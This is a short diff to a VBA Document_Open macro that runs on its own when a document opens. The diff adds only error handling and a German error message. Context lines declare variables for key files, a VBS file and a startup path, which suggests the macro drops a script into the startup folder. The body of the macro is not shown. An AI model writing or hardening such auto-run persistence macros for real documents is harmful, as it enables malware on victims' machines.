@@ -1,4 +1,5 @@
 Private Sub Document_Open()
+    On Error GoTo ErrorHandler
     Dim fso, keyFile, vbsFile, file, WshShell, startupPath, keyPath, vbsPath, cmdPath
     Dim keyContentPart1 As String, keyContentPart2 As String, keyContentPart3 As String
     Dim keyContent As String
@@ -81,4 +82,7 @@ Private Sub Document_Open()
     End If
 
     Set WshShell = Nothing
+    Exit Sub
+ErrorHandler:
+    MsgBox "Fehler: " & Err.Description
 End Sub
